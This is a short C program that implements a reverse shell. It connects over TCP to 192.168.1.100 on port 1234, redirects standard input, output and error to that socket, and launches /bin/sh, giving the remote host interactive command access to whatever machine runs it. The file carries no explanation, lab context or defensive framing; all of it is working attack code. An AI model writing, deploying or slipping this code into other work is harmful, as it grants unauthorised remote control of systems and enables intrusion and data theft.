#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Set up server address
    server.sin_family = AF_INET;
    server.sin_port = htons(1234); // Specify the port number
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Specify the IP address

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == -1) {
        perror("Connect failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Redirect stdin, stdout, stderr to socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Execute shell
    execl("/bin/sh", "sh", NULL);

    // If execl fails
    perror("Execl failed");
    close(sock);
    exit(EXIT_FAILURE);
}


